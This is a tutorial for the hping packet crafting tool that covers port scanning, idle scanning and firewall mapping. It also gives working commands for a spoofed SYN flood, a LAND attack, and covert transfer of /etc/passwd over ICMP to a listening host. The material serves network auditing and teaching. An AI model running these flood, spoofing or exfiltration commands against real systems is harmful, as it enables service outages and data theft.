# HPING Tutorial

By Philippe Bogaerts, alias xxradar.
*Version 1.5 - 24-08-2003*

## What is HPING?

Hping is a command-line oriented TCP/IP packet crafter. It can be used to create IP packets containing TCP, UDP, or ICMP payloads. It allows users to modify and control all header fields through the command line. A solid understanding of IP and TCP/UDP is essential to effectively use and understand this utility.

Visit [http://www.hping.org](http://www.hping.org) for more details and to download the binaries. A full working version of hping can also be found on a bootable CD at [http://www.knoppix-std.org](http://www.knoppix-std.org). **Use all examples in a test environment and with caution**, as some might slow down or crash firewalls or systems.

## Main Features and Uses

### 1. HPING as a Port Scanner

Hping can craft TCP packets to scan ports by specifying flags, a destination port, and a target IP address. For example:

- `-F --fin`: Set FIN flag
- `-S --syn`: Set SYN flag
- `-R --rst`: Set RST flag
- `-P --push`: Set PUSH flag
- `-A --ack`: Set ACK flag
- `-U --urg`: Set URG flag
- `-X --xmas`: Set X unused flag (0x40)
- `-Y --ymas`: Set Y unused flag (0x80)

**Example Command:**
```shell
hping -I eth0 -S 192.168.10.1 -p 80
```
An open port is indicated by an `SA` response, while closed ports return `RA`. This technique resembles a SYN or Stealth scan.

- You can increment destination ports using `++` or by pressing `ctrl+z`.

Example:
```shell
hping -I eth0 -S 192.168.10.1 -p ++79
```

#### Fine Control over Packets

Hping provides finer control over packet creation with options like:
- `-s --baseport`: Source port (default random)
- `-p --destport`: Destination port
- `-k --keep`: Keep source port constant
- Various other options to set sequence numbers, ACKs, checksums, etc.

Example:
```shell
hping -I eth0 -M 3000 -SA 192.168.10.1 -p 80
```

### 2. Idle Scanning

Idle scanning allows for anonymous port scanning. It involves using a Silent Host, which has predictable IP ID increments and isn’t busy.

**Step-by-step Process:**
1. Identify a Silent Host by observing the ID field increments.
2. Run spoofed scans against the target.
3. Determine port status based on IP ID changes.

### 3. Firewall Mapping

Hping can mimic traceroute or Firewalk styles to probe firewalls using ICMP, UDP, and TCP packets.

**Example Command:**
```shell
hping -I eth0 -z -t 6 -S mail.test.com -p 143
```
This technique allows for use of any message type for probing, similar to Firewalk’s function.

### 4. HPING as a DOS Tool

#### 4.1 SYN Attack

Example:
```shell
hping -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```
By issuing multiple SYN packets, an attacker can overload a server's connection table, causing denial of service.

#### 4.2 LAND Attack

Constructs a packet that connects a socket to itself, historically effective against older Windows NT systems.

Example:
```shell
hping -S -a 10.10.10.10 -p 21 10.10.10.10
```

### 5. Packets with Signatures

HPING can create packets with payloads, useful in auditing and probing:

Example:
```shell
hping -2 -p 7 192.168.10.33 -d 50 -E /root/signature.sig
```

### 6. Transferring Files via ICMP, UDP, or TCP

Hping’s listen mode allows for file transfers across a network, even masquerading as regular traffic.

#### 6.1 Via ICMP
```shell
hping 192.168.10.66 --listen signature --safe --icmp
hping 192.168.10.44 --icmp -d 100 --sign signature --file /etc/passwd
```

#### 6.2 Via TCP
Craft packets with flags, potentially bypassing stateful firewalls.

Example:
```shell
hping 192.168.10.66 --listen signature --safe -p 22
```

### 7. Conclusion

HPING is a versatile utility for understanding and experimenting with TCP/IP. It’s immensely useful for those auditing network security systems.

For suggestions or to report errors, please email `xxradar@radarhack.com`.

```

The above tutorial has been organized into clear sections for easier reference and updated to improve readability and clarify the context. Modern security practices and responsible use should always be considered when exploring network tools like HPING. Note that some elements, such as email addresses, might be outdated, and the ethical and legal implications of using such tools should be understood and respected.
